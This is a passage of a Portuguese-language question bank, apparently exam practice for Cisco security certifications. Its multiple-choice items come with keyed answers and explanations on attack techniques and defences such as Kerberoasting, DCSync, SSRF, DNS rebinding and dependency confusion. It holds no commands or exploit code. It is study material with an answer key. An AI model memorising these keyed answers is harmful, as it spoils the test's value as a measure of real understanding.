      "Forçar todas as queries de base de dados a ir por modems dial-up, enquanto os tiers web só podem usar bridges token-ring dos anos 90"
    ],
    "correct": 1,
    "explanation": "A microsegmentação aplica controlos por identidade ou label entre workloads para uma brecha num tier não alcançar livremente outros (east-west). Complementa o perímetro; não o substitui por uma VLAN plana, nem desliga cifra para taps, nem usa caminhos dial-up/token-ring obsoletos.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.4"
  },
  {
    "question": "Em que se baseia principalmente uma técnica living-off-the-land (LOLBins) durante uma intrusão?",
    "options": [
      "Distribuir um driver de kernel novo e não assinado em cada pen USB deixada no parque para os defensores só procurarem binários estranhos",
      "Substituir a raiz DNS corporativa por um pool NTP público para todos os portáteis perderem o default gateway até reimaging",
      "Abusar de ferramentas OS já confiáveis no host (PowerShell, wmic, bash, certutil) em vez de largar ficheiros de malware óbvios",
      "Desativar todas as regras de firewall no mundo com um único SNMP write no core para o movimento lateral nunca mais precisar de credenciais"
    ],
    "correct": 2,
    "explanation": "Living-off-the-land abusa de binários e scripts legítimos pré-instalados para as ações maliciosas se misturarem com atividade de admin e escaparem a AV só por hash. Não se define por drivers USB sozinhos, partidas DNS/NTP, nem por um SNMP write mágico que abre a Internet toda.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.9"
  },
  {
    "question": "Num compromisso da cadeia de fornecimento de software (estilo SolarWinds), que relação de confiança o atacante abusa sobretudo?",
    "options": [
      "Atualização ou pipeline de build de fornecedor de confiança, para código malicioso ir em software assinado já aceite",
      "Só o portal captive do Wi-Fi guest para imprimir cupões da cantina sem nunca tocar nos servidores de build de produção nem no CI/CD corporativo",
      "O beacon Bluetooth da máquina de café do escritório para reescrever communities BGP em todos os routers PE do campus todas as manhãs antes do almoço",
      "Uma única linha de fax não usada no átrio que de alguma forma passa a ser de um dia para o outro a única CA pública da organização inteira"
    ],
    "correct": 0,
    "explanation": "Ataques à supply-chain miram a confiança nas atualizações do fornecedor ou artefactos CI/CD — o malware é injetado a montante e entregue como software “legítimo”. Portais Wi-Fi guest, Bluetooth da máquina de café e faxes do átrio não são o caminho definidor desta classe de ataque.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Qual é o objetivo principal de segurança ao implantar honeypots ou tecnologia de deception mais ampla?",
    "options": [
      "Substituir permanentemente todas as regras de firewall de produção por uma política any-any aberta para os atacantes nunca mais fazerem scan",
      "Guardar todas as passwords dos colaboradores num único ficheiro em claro que os auditores possam descarregar sem qualquer desafio MFA",
      "Colocar sistemas ou credenciais isco que atraiam atacantes, gerem alertas de alta confiança e gastem tempo ao adversário sem dados reais",
      "Desativar o logging em todos os domain controllers para o movimento lateral ficar invisível ao SOC durante o resto do compromisso"
    ],
    "correct": 2,
    "explanation": "Honeypots/deception apresentam ativos ou tokens falsos que utilizadores legítimos quase não tocam; a interação é um sinal forte de atividade hostil e pode atrasar ou distrair atacantes. Não abrem firewalls any-any, não guardam passwords em claro nem desativam logging dos DC.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Porque é que os atacantes por vezes abusam de DNS tunneling para comando-e-controlo ou exfiltração de dados?",
    "options": [
      "Porque perguntas/respostas DNS podem transportar payloads codificados e muitas vezes passam filtros de perímetro que permitem DNS, escondendo C2 ou dados",
      "Porque o DNS cifra sempre todos os payloads com TLS 1.3 ponta-a-ponta e por isso nenhum resolver ou firewall consegue inspecionar esses conteúdos em caso algum",
      "Porque o DNS substitui o BGP no backbone da Internet e os routers encaminham ficheiros roubados apenas como LSAs OSPF Type-5 externos em todo o mundo",
      "Porque desativar o resolver recursivo apaga permanentemente todas as contas Active Directory do domínio sem deixar quaisquer entradas de auditoria registadas"
    ],
    "correct": 0,
    "explanation": "O DNS tunneling codifica dados em queries/respostas DNS; muitas redes permitem DNS de saída, o que pode contornar controlos que bloqueiam outros protocolos. O DNS não é inerentemente TLS ponta-a-ponta em todas as queries, não substitui BGP/OSPF nem apaga contas AD.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "6.5"
  },
  {
    "question": "No planeamento de disaster recovery, como diferem principalmente o RTO e o RPO?",
    "options": [
      "RTO é só a marca da biblioteca de fitas de backup; RPO é o número do canal Wi-Fi usado nos exercícios trimestrais de failover",
      "RTO e RPO são métricas idênticas que equivalem sempre ao intervalo Dead do OSPF configurado no par de routers de edge WAN",
      "RTO mede quanto tempo o SOC pode reter emails de phishing; RPO mede quantas regras de firewall têm de ser apagadas todas as noites",
      "RTO é o tempo máximo aceitável para restaurar um serviço após uma falha; RPO é a perda máxima de dados aceitável olhando para trás"
    ],
    "correct": 3,
    "explanation": "O Recovery Time Objective (RTO) limita quanto tempo um serviço pode ficar em baixo; o Recovery Point Objective (RPO) limita quantos dados se pode perder, expresso em tempo antes do incidente. Não são marcas de fitas, temporizadores OSPF nem métricas de phishing/limpeza de firewall.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.4"
  },
  {
    "question": "Num ambiente Windows Active Directory, o que reutiliza principalmente um ataque pass-the-hash (PtH)?",
    "options": [
      "Apenas a password em claro escrita uma vez no teclado, nunca qualquer material de credencial guardado em memória ou bases de dados",
      "Um hash NTLM (ou similar) roubado para autenticar como o utilizador sem conhecer a password em claro",
      "Um UPDATE BGP forjado que injeta uma rota mais específica para todos os domain controllers ficarem inalcançáveis a partir da LAN",
      "Um servidor DHCP rogue que distribui um intervalo APIPA para os clientes perderem DNS e não localizarem os domain controllers"
    ],
    "correct": 1,
    "explanation": "O pass-the-hash reutiliza hashes NTLM (ou relacionados) capturados para autenticar sem obter a password em claro. Não se limita a uma password digitada, nem é uma técnica de BGP ou de DHCP rogue.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Qual é o objetivo principal de segurança ao plantar canary tokens (ou honeytokens semelhantes) em ficheiros, URLs ou credenciais?",
    "options": [
      "Substituir por completo o SIEM corporativo para os analistas deixarem de precisar de logs, alertas ou regras de correlação",
      "Cifrar o disco de cada endpoint com uma chave BitLocker única derivada só da string canary e do hostname",
      "Obter um alerta de alta confiança quando alguém acede a um recurso falso que utilizadores legítimos nunca deveriam tocar",
      "Desativar permanentemente o MFA em contas privilegiadas para os operadores iniciarem sessão mais depressa num incidente declarado"
    ],
    "correct": 2,
    "explanation": "Canary tokens / honeytokens são artefactos isco que não devem ser usados no trabalho normal; o acesso gera um sinal forte de probing ou roubo. Não substituem o SIEM, não cifram discos por si nem desativam MFA.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "2.3"
  },
  {
    "question": "Em que se baseia principalmente um sistema air-gapped para se isolar de ameaças remotas via rede?",
    "options": [
      "Separação física (ou estritamente controlada) de redes não confiáveis para malware remoto não o alcançar por IP",
      "Um único VPC em cloud pública com security groups abertos para os operadores patcharem mais depressa a partir de qualquer host na Internet",
      "IPsec site-to-site sempre ligado ao edge da Internet para todas as atualizações serem puxadas automaticamente sem revisão",
      "Desativar logging local e antivírus para o host usar menos CPU enquanto continua ligado ao Wi-Fi corporativo"
    ],
    "correct": 0,
    "explanation": "O air-gap isola um sistema mantendo-o fora de redes não confiáveis (fisicamente ou com controlos extremos), reduzindo malware remoto e caminhos de C2. Exposição aberta em cloud, IPsec permanente à Internet ou juntar-se ao Wi-Fi corporativo desativando defesas contradiz esse isolamento.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Em que diferem principalmente as funções de red team, blue team e purple team num exercício de segurança?",
    "options": [
      "A red team só escreve políticas de compliance e checklists de auditoria; a blue team só faz patch de firmware; a purple team só gere crachás físicos à porta",
      "A blue team simula atacantes externos de ponta a ponta; a red team só monitoriza alertas SIEM; a purple team desativa logs para reduzir ruído nos testes",
      "A red team emula atacantes; a blue team defende e deteta; a purple team melhora a colaboração para os achados ofensivos subirem a qualidade da defesa",
      "Os três nomes significam o mesmo escalão de SOC e só diferem pelo logótipo do fornecedor no dashboard partilhado de tickets e ecrãs de operação"
    ],
    "correct": 2,
    "explanation": "As red teams emulam adversários (ofensiva). As blue teams protegem, detetam e respondem (defesa). O purple teaming liga as duas para técnicas de ataque e deteções melhorarem em conjunto. As outras opções invertem ou inventam funções e tratam as labels como o mesmo escalão de SOC.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Qual é a diferença principal entre consumir feeds de threat intelligence e fazer threat hunting?",
    "options": [
      "Os feeds só listam versões de software aprovadas para janelas de patch Tuesday; o hunting só inventaria impressoras, por isso nenhuma atividade usa telemetria de rede",
      "Os feeds de threat intel entregam indicadores ou contexto para enriquecer a deteção; o threat hunting procura proativamente na telemetria ameaças que podem não ter alertas prévios",
      "O hunting substitui todos os feeds porque um hunter nunca usa IOCs na prática; os feeds substituem o hunting porque a automação sozinha fecha todos os casos de intrusão desconhecida",
      "Os feeds são só para red teams em exercícios de phishing e tabletops; o hunting é só para background checks de RH e nunca toca em logs de segurança nem em pacotes"
    ],
    "correct": 1,
    "explanation": "Os feeds de threat intelligence fornecem IOCs/TTPs/contexto que ferramentas e analistas podem usar. O threat hunting é uma procura proativa na telemetria por atividade suspeita que os alertas podem ter falhado. O hunting usa muitas vezes intel, mas não é o mesmo que ingerir feeds passivamente; nenhuma das atividades se limita a listas de patches, impressoras ou checks de RH.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.3"
  },
  {
    "question": "O que tenta obter principalmente um ataque Kerberoasting num ambiente Active Directory?",
    "options": [
      "PSKs VPN em claro a partir do campo de opções DHCP, fazendo spoofing de um helper-address rogue em todas as VLANs de acesso do campus",
      "Material de password de contas de serviço crackável offline, pedindo tickets de serviço para SPNs e extraindo hashes dos tickets",
      "Um certificado golden permanente para enrollment MDM, repondo handshakes WPA3 SAE capturados só no segmento Wi-Fi de convidados (SSID guest)",
      "Chaves privadas SSH root de equipamentos de rede, forçando todas as sessões BGP a cair para TCP-AO com uma keychain intencionalmente vazia"
    ],
    "correct": 1,
    "explanation": "O Kerberoasting pede tickets de serviço Kerberos (TGS) para contas com SPN, extrai o material cifrado e faz crack offline para recuperar passwords de contas de serviço—muitas vezes com privilégios elevados. Não é sobre spoofing de helper DHCP para PSK VPN, certificados MDM via WPA3 SAE, nem esvaziar keychains TCP-AO de BGP para obter SSH root.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "O que tenta abusar principalmente um ataque de NTLM relay num ambiente Windows?",
    "options": [
      "Faz crack offline de TGTs Kerberos ao capturar respostas AS-REP só de contas com a pré-autenticação Kerberos explicitamente desativada no domínio",
      "Captura uma tentativa de autenticação NTLM da vítima e faz relay para outro serviço para o atacante se autenticar como esse utilizador sem saber a password",
      "Inunda o RADIUS com certificados cliente EAP-TLS forjados até o NPS revogar todas as contas de máquina e objetos computer guardados no Active Directory",
      "Só desliga o SMB signing no próprio portátil do atacante para as imagens de disco locais abrirem um pouco mais depressa no imaging forense de discos sobresselentes"
    ],
    "correct": 1,
    "explanation": "O NTLM relay intercepta uma autenticação NTLM legítima e reutiliza-a contra outro alvo (muitas vezes quando signing ou channel binding estão fracos). Não é AS-REP roasting, nem flooding EAP-TLS no RADIUS, nem um ajuste local de desempenho SMB.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.5"
  },
  {
    "question": "Em que é que o password spraying difere principalmente de um brute-force online clássico contra uma só conta?",
    "options": [
      "O spraying só funciona contra chaves públicas SSH e nunca contra portais web, gateways VPN ou outros formulários de login que ainda aceitam passwords normais de utilizador final",
      "O spraying exige acesso físico à consola do domain controller para cada password adivinhada ser escrita diretamente no ficheiro NTDS.dit na base de dados em disco",
      "O spraying testa um conjunto pequeno de passwords comuns em muitas contas para evitar lockouts, enquanto o brute-force clássico martela muitas passwords contra uma só conta-alvo",
      "Não há diferença real: ambos os nomes descrevem o mesmo fluxo Kerberoasting que pede tickets de serviço e faz crack dos hashes completamente offline a seguir"
    ],
    "correct": 2,
    "explanation": "O password spraying espalha poucas passwords prováveis por muitos utilizadores para ficar abaixo dos limiares de lockout; o brute-force online clássico concentra muitas tentativas numa conta. Não se limita a chaves SSH, não precisa de consola no DC e não é Kerberoasting.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Em ataques a Active Directory, o que permite principalmente um DCSync bem-sucedido a um adversário?",
    "options": [
      "Abusar de direitos de replicação de domain controller para extrair hashes de passwords (por exemplo via DRSUAPI) do AD sem executar payload na consola interativa do DC",
      "Substituir todos os templates administrativos de Group Policy por um MSI malicioso para todas as workstations instalarem software indesejado na próxima janela de reboot obrigatório",
      "Desativar a autenticação Kerberos em toda a forest e forçar todos os logons interativos e de rede a usar só NTLMv1 sem qualquer fallback para protocolos mais recentes",
      "Reescrever todos os SPNs de utilizador em registos DNS CNAME públicos para os ticket-granting tickets só resolverem via resolvers recursivos externos na Internet"
    ],
    "correct": 0,
    "explanation": "O DCSync abusa de privilégios de replicação do diretório (muitas vezes após roubar credenciais de alto privilégio) para pedir segredos/hashes como se o atacante fosse um DC. Não é trocar MSI de GPO, desligar Kerberos na forest, nem reescrever SPNs em CNAMEs DNS públicos.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Na análise de malware, o que significa principalmente “sandbox detonation”?",
    "options": [
      "Apagar o domain controller de produção durante a noite para cada binário suspeito se reinstalar a partir de uma pen USB no reboot seguinte de cada workstation do domínio",
      "Desativar todos os sensores EDR durante 24 horas para os analistas copiarem hashes de malware diretamente para o schema live do Active Directory e templates de GPO",
      "Executar um ficheiro suspeito num ambiente virtual isolado para observar o comportamento (rede, ficheiros, registo) sem infetar hosts de produção",
      "Publicar a amostra completa num paste site público para todos os SOCs recompilarem o binário antes de qualquer análise estática ou dinâmica local"
    ],
    "correct": 2,
    "explanation": "Sandbox detonation executa uma amostra suspeita num ambiente isolado e controlado para capturar indicadores comportamentais com segurança. Não é apagar DCs, desativar EDR para tocar no schema AD, nem publicar amostras em paste sites públicos como definição.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.6"
  },
  {
    "question": "Em ataques a Active Directory, em que é que um Golden Ticket difere principalmente de um Silver Ticket?",
    "options": [
      "Um Golden Ticket só é válido em workstations Linux juntas via Samba, enquanto um Silver Ticket funciona só em tenants Azure AD cloud-only sem qualquer domain controller on-premises presente",
      "Um Golden Ticket forja um TGT com o hash KRBTGT para pedidos amplos de service tickets; um Silver Ticket forja um TGS para um serviço com o hash dessa conta de serviço",
      "Ambos os tickets são tokens JWT idênticos emitidos por políticas Conditional Access do Entra ID e nunca envolvem chaves Kerberos guardadas em domain controllers on-premises",
      "Um Silver Ticket exige sempre direitos DCSync primeiro num DC, ao passo que um Golden Ticket se cria a partir de qualquer conta guest local sem credenciais de domínio nem material KRBTGT"
    ],
    "correct": 1,
    "explanation": "Golden Tickets forjam TGTs com o hash KRBTGT (acesso amplo para pedir service tickets). Silver Tickets forjam um TGS para um serviço com o hash dessa conta. São construções Kerberos, não regras JWT só Linux/Azure, e o Silver não exige exclusivamente DCSync primeiro.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Na deteção de rede, como se manifesta tipicamente o “beaconing” de malware para um servidor C2 (command-and-control)?",
    "options": [
      "Um único burst de ruído UDP aleatório que nunca se repete e só aparece no primeiro DHCP Discover após um cold boot do endpoint na VLAN de acesso",
      "Flood contínuo OSPF full-mesh entre todas as workstations para o C2 reescrever a topologia IGP e os tipos de área do campus em tempo real em todos os sites e VRFs",
      "Emails cifrados só para o mail gateway local, sem callbacks e sem abrir ligações outbound para qualquer host externo ou resolver DNS",
      "Ligações ou queries DNS outbound periódicas, muitas vezes low-and-slow, de um implant para o C2 do atacante para check-in e comandos"
    ],
    "correct": 3,
    "explanation": "Beaconing são check-ins repetidos do malware ao C2 (HTTP/DNS/etc.), muitas vezes periódicos e discretos. Não é um burst UDP único no DHCP, rewrite OSPF em mesh, nem só email sem callbacks outbound.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.7"
  },
  {
    "question": "O que é que o AS-REP roasting abusa principalmente em ambientes Kerberos de Active Directory?",
    "options": [
      "Inunda o RADIUS com handshakes EAP-TLS até cada wireless controller esquecer os servidores AAA e cair para SSIDs abertos em todo o fabric campus da empresa",
      "Reescreve communities BGP em todos os routers PE de um dia para o outro para o tráfego de retorno preferir um peer ISP malicioso que só anuncia uma default para a empresa",
      "Esvazia todos os pools DHCP com tempestades Discover e MACs aleatórios para os clientes só receberem endereços APIPA e nunca aprenderem os servidores DNS de domínio",
      "Pede mensagens AS-REP para contas que não exigem pré-autenticação Kerberos e depois faz crack offline do material cifrado para recuperar essas passwords"
    ],
    "correct": 3,
    "explanation": "O AS-REP roasting mira contas com pré-autenticação Kerberos desativada: o atacante obtém o ciphertext AS-REP e faz crack offline da password. Não é flood RADIUS/EAP-TLS, rewrite de communities BGP, nem starvation DHCP.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Em ataques baseados em Kerberos, o que envolve principalmente o Pass-the-Ticket (PtT)?",
    "options": [
      "Fazer crack de pares challenge-response NTLM capturados só via spoofing LLMNR/NBT-NS na LAN, sem nunca ler ou injetar um ticket Kerberos de qualquer cache do sistema",
      "Enviar códigos SMS de uso único de phishing que expiram em trinta segundos para a fadiga MFA forçar cada utilizador a aprovar um push fraudulento no telemóvel",
      "Reutilizar um ticket Kerberos roubado (TGT ou service ticket) da memória ou disco para autenticar como esse principal sem conhecer a password da conta",
      "Fazer brute-force offline de handshakes WPA3 SAE durante dias para criar um certificado permanente de enrollment MDM que só funciona em SSIDs guest e nunca nos corporativos"
    ],
    "correct": 2,
    "explanation": "Pass-the-Ticket reutiliza um ticket Kerberos roubado (muitas vezes de LSASS/cache de tickets) para autenticar sem a password em claro. Distingue-se do crack de hashes NTLM via spoofing LLMNR, phishing de fadiga MFA, ou crack WPA3 SAE.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Porque é que os atacantes fazem muitas vezes dump de credenciais do processo LSASS num host Windows?",
    "options": [
      "O LSASS só guarda nomes da fila do spooler de impressão e caminhos de drivers, por isso o dump é obrigatório antes de qualquer movimento lateral por SMB na LAN corporativa",
      "O LSASS guarda material de autenticação (ex.: hashes NTLM, tickets Kerberos, por vezes segredos em claro) que pode permitir Pass-the-Hash, Pass-the-Ticket ou mais pivots no domínio",
      "O LSASS é o único sítio onde a Group Policy guarda PSKs Wi-Fi de cada SSID, e o dump substitui a necessidade de quaisquer credenciais de domínio ao juntar tenants Azure AD só na cloud",
      "O LSASS cifra a imagem do firmware BIOS local a cada boot, por isso o dump é a única forma suportada de desbloquear chaves de recuperação BitLocker dos bancos PCR do TPM nesse host"
    ],
    "correct": 1,
    "explanation": "O LSASS (Local Security Authority Subsystem Service) faz cache de segredos de logon como hashes NTLM e tickets Kerberos; o dump alimenta PtH/PtT e movimento lateral. Não é repositório de filas de impressão, nem o único cofre GPO de PSK Wi-Fi para Azure, nem um ritual de desbloqueio BIOS/BitLocker TPM.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "O que caracteriza malware fileless em ataques a endpoints?",
    "options": [
      "Corre sobretudo em memória ou via ferramentas/scripts nativos de confiança (ex.: PowerShell, WMI), com pouco ou nenhum EXE malicioso tradicional escrito em disco, o que reduz a eficácia de scans AV baseados em ficheiros",
      "Só consegue infetar impressoras air-gapped sem CPU, RAM ou stack de rede, e guarda sempre um binário PE completo em C:\\Windows\\System32 antes de cada execução, independentemente de qualquer default específico do fabricante na plataforma.",
      "Define-se como qualquer worm USB autorun que obriga a vítima a fazer duplo clique num .exe num drive de rede mapeado e nunca usa living-off-the-land nem técnicas em memória em redes campus e empresariais de produção típicas.",
      "Encripta exclusivamente partições de disco com uma nota pública de ransomware e nunca abusa de hosts de scripting, payloads no registo ou injeção refletiva de DLL em memória em modelos comuns de deployment IOS, IOS-XE e NX-OS."
    ],
    "correct": 0,
    "explanation": "Malware fileless privilegia execução em memória ou living-off-the-land (PowerShell/WMI/etc.), pelo que scans clássicos em disco falham mais. Não se limita a impressoras air-gapped, não é só worm USB de .exe, nem é sinónimo de ransomware só de encriptação de disco.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "2.8"
  },
  {
    "question": "Em cenários de ameaça cibernética, o que descreve tipicamente o island hopping?",
    "options": [
      "Mover fisicamente discos rígidos entre dois data centers air-gapped por estafeta, sem nunca usar a Internet nem qualquer rede de um fornecedor de serviços geridos",
      "Comprometer uma organização ligada mais fraca (muitas vezes fornecedor/MSP/parceiro) e depois pivotar dessa relação de confiança para o ambiente do alvo principal",
      "Saltar VLANs apenas forjando tags 802.1Q numa porta local de switch, sem phishing, exploit nem abuso de qualquer caminho de confiança de terceiros fora da LAN",
      "Rodar domínios C2 a cada milissegundo com one-time pad criptográfico para resolvers DNS e inspeção SNI TLS se tornarem permanentemente impossíveis em todos os caminhos"
    ],
    "correct": 1,
    "explanation": "Island hopping abusa da confiança num terceiro ligado (fornecedor/MSP/parceiro): compromete a ilha mais fraca e pivota para o alvo real. Não são transferências de disco por estafeta, não é só VLAN hopping local, nem a definição de rotação ultra-rápida de domínios C2.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Como é que os Domain Generation Algorithms (DGAs) ajudam tipicamente o malware a manter reachability de command-and-control?",
    "options": [
      "Fixam permanentemente um único IP hard-coded no binário para os defensores só precisarem de bloquear um endereço durante toda a campanha, sem qualquer envolvimento de DNS, independentemente de qualquer default específico do fabricante na plataforma.",
      "Substituem todas as queries DNS por entradas estáticas em /etc/hosts distribuídas por USB para o malware nunca contactar um resolver e não ser observado em telemetria DNS passiva em redes campus e empresariais de produção típicas.",
      "Geram algoritmicamente muitos nomes de domínio candidatos ao longo do tempo; o operador regista um (ou poucos) desse conjunto para os hosts infetados ainda encontrarem o C2 mesmo depois de domínios individuais serem bloqueados",
      "Encriptam toda a LSDB OSPF dentro de registos TXT para os routers tratarem o tráfego de botnet como externos Type-5 e nunca permitirem às equipas de segurança fazer sinkhole de qualquer nome gerado em modelos comuns de deployment IOS, IOS-XE e NX-OS."
    ],
    "correct": 2,
    "explanation": "Os DGAs produzem muitos nomes possíveis; os atacantes registam os que precisam para o malware reencontrar o C2 após takedowns. Não são um único IP hard-coded, não são só /etc/hosts por USB, nem truques de LSDB OSPF em TXT.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.9"
  },
  {
    "question": "O que é server-side request forgery (SSRF)?",
    "options": [
      "Um ataque em que um script injetado numa página web corre nos browsers de outros utilizadores e rouba os cookies de sessão enquanto veem a página",
      "Um ataque em que o browser da vítima é enganado para enviar um pedido autenticado a um site onde tem sessão iniciada, como mudar a password",
      "Um ataque em que o atacante faz um servidor vulnerável enviar pedidos para alvos à sua escolha, como serviços internos ou endpoints de metadata da cloud",
      "Um ataque em que o atacante inunda um servidor web com ligações TCP meio abertas até a tabela de ligações encher e novos utilizadores não conseguirem ligar"
    ],
    "correct": 2,
    "explanation": "No SSRF o próprio servidor é usado como proxy, muitas vezes para chegar a sistemas só internos ou à metadata da cloud (ex.: 169.254.169.254) e roubar credenciais. A opção 1 descreve XSS, a 2 CSRF (falsificação do lado do cliente) e a 4 um SYN flood.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Como é que o domain fronting ajuda o malware a esconder o tráfego de comando e controlo (C2)?",
    "options": [
      "Regista milhares de domínios aleatórios todos os dias para que os defensores não consigam bloquear todos antes de o malware encontrar um que o operador controla",
      "Reescreve os registos DNS do próprio domínio da vítima para que os utilizadores internos sejam redirecionados para uma página de login clonada alojada pelo atacante",
      "Esconde os comandos C2 dentro de payloads ICMP echo para que firewalls que só inspecionam TCP e UDP nunca vejam as instruções do atacante",
      "Mostra um domínio reputado alojado numa CDN no DNS e no SNI do TLS, enquanto o cabeçalho HTTP Host dentro da sessão cifrada aponta para o backend do atacante"
    ],
    "correct": 3,
    "explanation": "O domain fronting abusa de CDNs: as camadas visíveis (DNS, SNI) indicam um domínio de confiança, mas o cabeçalho Host interno encaminha o pedido para o serviço do atacante na mesma CDN, pelo que bloqueá-lo implica bloquear o domínio popular. A opção 1 é DGA, a 2 DNS hijacking/pharming e a 3 túnel ICMP.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.9"
  },
  {
    "question": "Durante a resposta a incidentes, que evidência deve normalmente ser recolhida primeiro segundo a ordem de volatilidade?",
    "options": [
      "Registos da CPU, cache e conteúdo da RAM, junto com processos em execução e ligações de rede ativas, porque se perdem ao desligar",
      "As fitas de backup arquivadas fora do local, porque são as cópias mais antigas dos dados e as mais prováveis de serem sobrescritas primeiro",
      "A imagem completa do disco do host afetado, porque os dados em disco desaparecem assim que o responder abre o ticket do caso",
      "Os logs impressos e documentos físicos no escritório, porque a evidência em papel degrada-se mais depressa do que dados na memória"
    ],
    "correct": 0,
    "explanation": "A ordem de volatilidade manda capturar primeiro os dados mais efémeros: registos, cache, RAM, estado de processos e rede, depois ficheiros temporários, disco, logs remotos e por fim media de arquivo. Backups e imagens de disco são muito menos voláteis do que a memória.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.6"
  },
  {
    "question": "Um atacante carrega a página de transferências de um banco num iframe invisível num site de jogos e leva os utilizadores a clicar num botão Confirmar escondido. Que ataque é este e qual é uma defesa padrão?",
    "options": [
      "Clickjacking; o banco deve enviar X-Frame-Options DENY ou CSP frame-ancestors para os browsers recusarem mostrar as páginas em frames",
      "Cross-site scripting; o banco deve fazer hash de todas as passwords com bcrypt para que os scripts injetados não leiam as credenciais",
      "SQL injection; o banco deve usar queries parametrizadas para que o botão escondido não altere a instrução SQL enviada à base de dados",
      "DNS spoofing; o banco deve ativar DNSSEC na sua zona para que o site de jogos deixe de resolver o domínio do banco para um servidor falso"
    ],
    "correct": 0,
    "explanation": "O clickjacking (UI redressing) sobrepõe uma página legítima num frame a um isco, para a vítima clicar em botões reais. A defesa é proibir o enquadramento com X-Frame-Options ou Content-Security-Policy frame-ancestors. Não há script injetado, nem SQL alterado, nem mexidas na resolução DNS.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O domínio de um site malicioso resolve primeiro para o servidor do atacante com TTL muito curto e depois volta a resolver para 192.168.1.1, permitindo ao browser da vítima enviar pedidos para a página de administração do router de casa. Que técnica é esta?",
    "options": [
      "DNS cache poisoning, porque o atacante injeta respostas falsas no resolver do ISP e todos os utilizadores desse resolver são redirecionados para o router",
      "Domain generation algorithm (DGA), porque o malware cria milhares de domínios aleatórios por dia para os defensores não conseguirem bloquear os servidores",
      "DNS rebinding, porque a mesma origem passa a apontar para um IP interno, e a same-origin policy do browser deixa o script do atacante chegar lá",
      "DNS tunneling, porque o atacante codifica dados roubados em labels de subdomínio longas e exfiltra-os através de consultas DNS recursivas normais"
    ],
    "correct": 2,
    "explanation": "O DNS rebinding abusa de TTLs curtos: o hostname (mesma origem) passa a apontar para um IP privado e o JavaScript do atacante fala com dispositivos internos. Defesas: resolvers que bloqueiam respostas privadas para nomes públicos, validação do cabeçalho Host e autenticação nos serviços internos. Cache poisoning falsifica dados do resolver, DGA serve a resiliência de C2 e tunneling serve a exfiltração.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O servidor de build de uma empresa descarrega um pacote interno chamado acme-utils. Um atacante publica acme-utils versão 99.0 no registo público npm e o build instala-o. Que ataque é este e qual é uma mitigação importante?",
    "options": [
      "Typosquatting; os programadores devem ser treinados a escrever bem os nomes dos pacotes, porque o ataque só resulta com nomes mal escritos",
      "Dependency confusion; usar pacotes com scope/namespace e apontar o build para um registo privado com versões fixas e lockfiles",
      "Ataque watering hole; bloquear o site do npm no proxy da empresa, porque o pacote só chega a utilizadores que navegam no registo",
      "Man-in-the-browser; instalar uma extensão anti-malware nos agentes de build, porque o código malicioso é injetado na sessão do browser"
    ],
    "correct": 1,
    "explanation": "A dependency confusion explora gestores de pacotes que preferem a versão mais alta entre fontes públicas e privadas. Scopes/namespaces, um único registo privado (que faz proxy do público), versões fixas e lockfiles evitam-na. Typosquatting depende de nomes mal escritos, watering hole compromete um site que as vítimas visitam e man-in-the-browser é malware na sessão do browser.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "3.7"
  },
  {
    "question": "Um utilizador autenticado muda o URL /api/invoices/1043 para /api/invoices/1044 e vê a fatura de outro cliente. Que vulnerabilidade é esta?",
    "options": [
      "Cross-site request forgery (CSRF), porque o browser envia o cookie de sessão num pedido que o utilizador nunca quis enviar",
      "Directory traversal, porque o número no caminho deixa o utilizador sair da raiz web e ler ficheiros do disco do servidor",
